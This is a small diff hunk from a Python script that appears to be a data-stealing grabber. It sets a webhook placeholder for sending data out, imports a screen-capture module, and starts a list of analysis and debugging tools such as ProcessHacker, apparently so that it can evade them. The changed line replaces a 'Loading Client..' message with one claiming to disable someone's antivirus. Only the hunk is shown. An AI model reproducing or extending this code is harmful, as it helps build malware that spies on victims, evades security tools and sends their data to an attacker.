@@ -6,7 +6,7 @@ from pystyle import *
 from PIL import ImageGrab
 os.system('cls')
 webhook = "inputtedHook"
-print("Loading Client..")
+print("attempting to disable adrians antivirus... wait like 5 seconds")
 process = [
     "ProcessHacker.exe",
     "httpdebuggerui.exe",
